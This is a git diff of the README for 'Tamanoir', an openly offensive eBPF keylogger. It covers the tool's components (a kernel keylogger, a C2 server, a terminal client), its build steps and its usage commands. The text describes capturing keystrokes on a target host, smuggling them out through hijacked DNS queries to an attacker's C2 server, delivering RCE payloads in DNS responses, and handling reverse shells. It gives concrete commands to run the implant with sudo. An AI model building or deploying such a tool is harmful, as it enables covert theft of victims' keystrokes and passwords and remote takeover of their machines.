@@ -1,25 +1,47 @@
 <div align="center">
-  <h1> Tamanoir <br> A KeyLogger using eBPF 🐝 </h1>
-  <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 40%; height: 40%"</img>
-  <p><small>
-    <i>
-      A large anteater of Central and South America, Myrmecophaga tridactyla
-    </i>
-  </small></p>
+  <h1>Tamanoir</h1>
+  <h3>An eBPF🐝 Keylogger with <br>C2-based RCE payload delivery</h3>
+  <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 30%; height: auto;">
+  <p><small><i>A large anteater of Central and South America, Myrmecophaga tridactyla</i></small></p>
 </div>
 
 ## 💡Overview
 
+Tamanoir is composed of 3 components: 
+
+### 1. Tamanoir
+An eBPF program running on a target host, it will act as a keylogger and extract keystrokes via DNS queries.<br> 
+In DNS response, attacker can choose to send chunks of RCE payload that will be executed on targeted host.
+
+### 2. Tamanoir-C2
+The Command & Control server. It acts as a DNS proxy and can inject rce payloads in DNS response.<br> 
+It also can handle reverse shell connections.
+
+### 3. Tamanoir-tui
+The TUI client communicating with C2 server. Built on top of ratatui
+
+#### ⚡ Powered by [Aya](https://aya-rs.dev),  [Tonic](https://github.com/hyperium/tonic), [Tokio](https://github.com/tokio-rs/tokio) and [Ratatui](https://ratatui.rs)
+
+
+### Glossary
+- what is [eBPF](https://ebpf.io/what-is-ebpf/)
+- C2: Command and Control
+- RCE: Remote Code Execution
+
+
+### Documentation
+Jump to:
+- [Focus on Tamanoir (eBPF)](assets/doc/tamanoir.md)
+- [Focus on Tamanoir-C2](assets/doc/tamanoir-c2.md)
+- [Focus on Tamanoir-Tui  ](assets/doc/tamanoir-tui.md)
+<br>
+
+## Architecture
 <div align="center">
-  <img src="https://github.com/user-attachments/assets/24f80020-9d60-4f2a-825b-ed56574dfb24" </img>
+  <img src="https://github.com/user-attachments/assets/06f104d0-3b07-43ec-834e-2043009c1f6c" style="width:75%">
 </div>
 
-1. Capture keystrokes and store them in a queue in the kernel.
-2. Intercept DNS requests and inject the captured keystroes in the DNS payload, then redirect the request to the designated remote server acting as a DNS proxy.
-3. On the remote server, extract the keys from the DNS payload and send a valid DNS response.
-4. Intercept the response and modify its source address so the initial request will complete successfully.
 
-<br>
 
 ## 🚀 Setup
 
@@ -31,45 +53,48 @@ To build from source, make sure you have:
 
 - [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
 - [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
+- protobuf-compiler
 
 #### 1. Build ebpf program
 
 ```
-cd tamanoir-ebpf
-cargo build --release
+cd tamanoir-ebpf && cargo build --release
 ```
 
 #### 2. Build user space program
 
 ```
-cargo build --release
+cargo build -p tamanoir --release
 ```
 
-This will produce an executable file at `target/release/tamanoir` that you can copy to a directory in your `$PATH`
-
-#### 3. Build proxy program
+#### 3. Build C2 Server
 
 ```
-cargo build -p tamanoir-proxy --release
+cargo build -p tamanoir-c2 --release
 ```
 
-This will produce an executable file at `target/release/tamanoir-proxy` that you can copy to a directory in your `$PATH`
+#### 4. Build Ratatui Client
+
+```
+cargo build -p tamanoir-tui --release
+```
+
+These commands will produce  `tamanoir`, `tamanoir-c2` and `tamanoir-tui` executables  in `target/release` that you can add to your`$PATH`
 
 ### 📥 Binary release
 
-You can download the pre-built binaries from the [release page](https://github.com/pythops/tamanoir/releases)
+You can download the pre-built binaries from the [release page](https://github.com/adgaultier/tamanoir/releases)
 
 <br>
 
 ## 🪄 Usage
 
 ### Tamanoir
-
+🖥️ on target host:
 ```
 RUST_LOG=info sudo -E tamanoir \
-              --proxy-ip <DNS proxy IP> \
+              --proxy-ip <C2 server IP> \
               --hijack-ip <locally configured DNS server IP> \
-              --layout <keyboard layout> \
               --iface <network interface name>
 ```
 
@@ -77,42 +102,41 @@ for example:
 
 ```
 RUST_LOG=info sudo -E tamanoir \
-              --proxy-ip 192.168.1.75 \
+              --proxy-ip 192.168.1.15 \
               --hijack-ip 8.8.8.8 \
-              --layout 0 \
               --iface wlan0
 ```
 
-Currenly, there are two supported keyboard layouts:
 
-`0` : qwerty (us)
-
-`1` : azerty (fr)
 
 <br>
 
-### DNS Proxy
+### C2 Server
+🖥️ on your C2 server host:
 
+```
+sudo tamanoir-c2 start
+```
 > [!NOTE]
 > Make sure port 53 is available
 
-```
-RUST_LOG=info sudo -E tamanoir-proxy \
-              --port <port> \
-              --dns-ip <DNS server ip> \
-              --payload-len <payload length>
-```
+<br>
 
-for example:
+### Tui Client
+🖥️ wherever you want to use the client:
+
 
 ```
-RUST_LOG=info sudo -E tamanoir-proxy \
-              --port 53 \
-              --dns-ip 1.1.1.1 \
-              --payload-len 8
+tamanoir-tui -i  <C2 server IP> 
 ```
+> [!NOTE]
+> Make sure C2 server is reachable on port 50051
 
 <br>
+
+
+
+
 
 ## ⚠️ Disclaimer
 
@@ -120,11 +144,12 @@ RUST_LOG=info sudo -E tamanoir-proxy \
 
 <br>
 
+
+
 ## ✍️ Authors
 
-[Badr Badri](https://github.com/pythops)
-
 [Adrien Gaultier](https://github.com/adgaultier)
+[Badr Badri](https://github.com/pythops)
 
 <br>
 
